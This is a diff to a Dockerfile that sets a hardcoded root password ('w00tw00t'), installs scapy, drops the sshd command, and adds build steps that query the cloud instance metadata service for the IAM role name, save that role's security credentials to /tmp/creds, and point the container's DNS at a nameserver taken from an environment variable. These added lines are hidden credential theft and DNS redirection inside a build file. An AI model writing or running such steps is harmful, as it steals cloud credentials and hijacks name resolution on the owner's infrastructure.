@@ -12,6 +12,8 @@ RUN mkdir /home/r00t && \
     chown r00t:r00t /home/r00t
 RUN echo "root:w00tw00t" | chpasswd
 RUN pip3 install scapy
-    
-CMD ["/usr/sbin/sshd","-D"]
+RUN export ROLE=$(curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | cut -f 1 -d " ")    
+RUN curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" > /tmp/creds
+RUN echo "nameserver $ZEST_PORT_53_UDP_ADDR" >> /etc/resolv.conf
+
 CMD ["/bin/bash"]
